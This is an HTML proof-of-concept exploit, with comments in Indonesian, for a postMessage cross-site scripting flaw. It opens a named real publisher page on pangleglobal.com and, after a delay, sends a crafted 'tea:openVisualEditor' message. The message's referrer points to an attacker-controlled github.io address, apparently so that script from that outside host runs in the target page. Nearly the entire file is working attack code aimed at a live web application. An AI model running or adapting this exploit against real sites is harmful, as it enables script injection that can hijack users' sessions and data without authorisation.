<!-- poc.html — pakai window.open instead -->
<html>
<body>
<h2>postMessage XSS PoC</h2>
<p id="status">Click button to start</p>
<button onclick="startPoC()">Launch PoC</button>
<script>
const ATTACKER = 'https://telojos11.github.io/cekcek';

function startPoC() {
  document.getElementById('status').textContent = 'Opening target...';
  
  // Buka target di window baru
  const target = window.open('https://www.pangleglobal.com/publisher/companyInfo');
  
  setTimeout(() => {
    document.getElementById('status').textContent = 'Sending payload...';
    
    // Kirim ke semua window (broadcast)
    target.postMessage(JSON.stringify({
      type: 'tea:openVisualEditor',
      payload: { referrer: ATTACKER }
    }), '*');
    
    document.getElementById('status').textContent = 
      'Payload sent! Check the opened window for XSS execution.';
  }, 3000); // tunggu 3 detik untuk page load
}
</script>
</body>
</html>
